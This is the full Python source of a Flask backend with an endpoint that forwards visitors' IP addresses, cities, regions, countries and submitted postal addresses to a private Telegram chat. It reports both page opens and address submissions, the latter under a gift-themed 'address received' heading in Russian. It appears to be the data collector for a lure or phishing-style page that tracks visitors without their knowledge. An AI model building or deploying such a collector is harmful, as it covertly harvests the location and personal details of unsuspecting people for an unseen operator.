import os
import logging
import requests
from dotenv import load_dotenv
from flask import Flask, request, jsonify
from flask_cors import CORS

load_dotenv()

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

BOT_TOKEN = os.getenv('BOT_TOKEN')
YOUR_CHAT_ID = os.getenv('CHAT_ID')
TELEGRAM_API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

app = Flask(__name__)
CORS(app)

def send_telegram_message(chat_id: str, message: str):
    """Send message to Telegram"""
    try:
        payload = {
            'chat_id': chat_id,
            'text': message,
            'parse_mode': 'HTML'
        }
        response = requests.post(TELEGRAM_API_URL, json=payload, timeout=10)
        
        if response.status_code == 200:
            logger.info(f"✅ Message sent successfully")
            return True
        else:
            logger.error(f"❌ Telegram error: {response.status_code}")
            return False
    except Exception as e:
        logger.error(f"❌ Send error: {e}")
        return False

@app.route('/api/notify', methods=['POST'])
def notify():
    try:
        data = request.get_json()
        logger.info(f"📥 Request received")
        
        message_type = data.get('type', 'Уведомление')
        address = data.get('address', '')
        ip = data.get('ip', 'N/A')
        city = data.get('city', 'N/A')
        region = data.get('region', 'N/A')
        country = data.get('country', 'N/A')
        timestamp = data.get('timestamp', 'N/A')
        
        logger.info(f"📍 Location: {city}, {region}, {country}")
        
        # Build simple message
        if address:  # Address submitted
            message = f"""<b>🎁 АДРЕС ПОЛУЧЕН!</b>

📮 <b>Адрес:</b>
{address}

━━━━━━━━━━━━━━━━━━━━━
<b>📍 Информация:</b>

IP: <code>{ip}</code>
Город: {city}
Регион: {region}
Страна: {country}
Время: {timestamp}
"""
        else:  # Page opened
            message = f"""<b>{message_type}</b>

IP: <code>{ip}</code>
Город: {city}
Регион: {region}
Страна: {country}
Время: {timestamp}
"""
        
        logger.info(f"📤 Sending to Telegram...")
        result = send_telegram_message(YOUR_CHAT_ID, message)
        
        if result:
            return jsonify({'success': True, 'message': 'Sent'}), 200
        else:
            return jsonify({'success': False, 'message': 'Failed'}), 500
            
    except Exception as e:
        logger.error(f"❌ Error: {e}", exc_info=True)
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/health', methods=['GET'])
def health():
    return jsonify({'status': 'ok'}), 200

def main():
    logger.info("🚀 Starting server...")
    logger.info(f"📱 Chat ID: {YOUR_CHAT_ID}")
    
    port = int(os.getenv('PORT', 10000))
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)

if __name__ == '__main__':
    main()